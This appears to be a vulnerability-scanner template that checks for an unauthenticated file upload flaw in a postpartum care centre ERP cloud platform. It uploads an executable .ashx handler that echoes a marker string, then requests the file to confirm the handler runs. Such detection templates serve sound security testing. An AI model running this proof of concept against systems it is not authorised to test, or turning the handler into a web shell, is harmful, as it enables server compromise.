id: poc-yaml-jintongfang-erp-uploadcomponenthandler-upload
info:
  name: 月子会所ERP管理云平台 UploadComponentHandler.ashx接口存在文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传
  description: |
    月子会所ERP管理云平台 UploadComponentHandler.ashx接口存在文件上传漏洞

variables:
  t1: "{{rand_int(100, 1000)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/Page/upload/UploadComponentHandler.ashx"
    headers:
      Content-Type: multipart/form-data; boundary=00content0boundary00
    body: |
      --00content0boundary00
      Content-Disposition: form-data; name="file"; filename="1.ashx"
      
      <% @ webhandler language="C#" class="AverageHandler" %>
      using System;
      using System.Web;

      public class AverageHandler : IHttpHandler
      {
      public bool IsReusable {
      get {
      return true;
      }
      }
      public void ProcessRequest(HttpContext ctx)
      {
      ctx.Response.Write("vulnerability{{t1}}");
      }
      }
      --00content0boundary00--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: filename
        part: body
        internal: true
        regex:
          - "UploadBaseFolder/ERP(?P<filename>.*?).ashx"

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/UploadBaseFolder/ERP/{{filename}}.ashx"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "vulnerability{{t1}}"
        part: body
